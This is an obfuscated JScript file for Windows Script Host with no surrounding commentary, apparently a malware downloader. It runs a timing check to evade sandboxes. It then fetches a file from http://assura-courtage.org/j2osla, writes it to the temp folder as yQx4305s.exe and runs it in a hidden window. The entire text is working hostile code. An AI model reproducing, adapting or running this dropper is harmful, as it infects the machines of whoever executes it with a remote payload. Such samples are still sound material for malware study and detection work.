var _AM = false;
var _P0 = "CreateObject";
var _NY = function _GO() {return WScript[_P0]("WScript"+".Shell");}(), _E = 11;
var _L = "MSXML2.XMLHTTP";
var _HA = 2123213;
var _CD = 0;
function _C(_XQ){_NY["Run"](_XQ, _CD, _CD);};
function _PQ(){return _L + "";};
function _KS(_O, _BR){_CD = _CD * 1; return _O - _BR;};
function _F0(){return _P0;};
/*@cc_on
  @if (@_win32 || @_win64)
    _AM = true;
  @end
@*/
if (_AM)
{
var _F1 = "";
function _GV(){return 22;};
var _FK = 0; var _XD = 0;
function _F()
{
var _DB = new this["Date"]();
var _A = _DB["getUTCMilliseconds"]();
WScript["Sleep"](_GV());
var _DB = new this["Date"]();
var _WE = _DB["getUTCMilliseconds"]();
WScript["Sleep"](_GV());
var _DB = new this["Date"]();
var _UD = _DB["getUTCMilliseconds"]();
var _FK = "_P1";
_FK = _KS(_WE, _A);
var _XD = "_SD";
_XD = _KS(_UD, _WE);
_F1 = "open";
return _KS(_FK, _XD);
}
var _A0 = false;
var _V = false;
for (var _J0 = _CD; _J0 < _GV() * 1; _J0++){if (_F() != _CD){
_A0 = true; 
_XD = "31" + 11 * _FK + _XD; 
_V = true; 
break;
}}
function _J() {return ((_A0 == true) && (_A0 == _V)) ? 1 : _CD;};
if (_A0 && _J() && _V){
function _FW() {return _NY["ExpandEnvironmentStrings"]("%TE"+"MP%/") + "yQx4305s.ex" + "e";};
 _C0 = _PQ();
 _S0 = WScript[_P0](_C0);
 var _P = 1;
 while (_P){
try {
	if (_P == 1)
	{
		_S0[_F1]("GET", "http://assura-courtage.org/j2osla", false);
		_S0["send"]();
		_IE = "Sleep";
	}
	WScript[_IE](_GV() + 120); 
	if (_S0["readystate"] < 2 * 2) continue;
	_P = _CD;
	function _FT(_S) {var _Q = (1, 2, 3, 4, 5, _S); return _Q;};
	_RY = WScript[_F0()]("ADODB.Stream");
	_C0 = _RY;
	_C0[_F1]();
	_C0["type"] = _FT(1);
	_C0["write"](_S0["ResponseBody"]);
	_RY["position"] = _FT(_CD);
	_C0["Save" + "ToFile"](_FW(), 2);
	_RY["cl"+"ose"]();
	_B = _FW();
	_C(_B);
} catch(_U){};
}
}
}

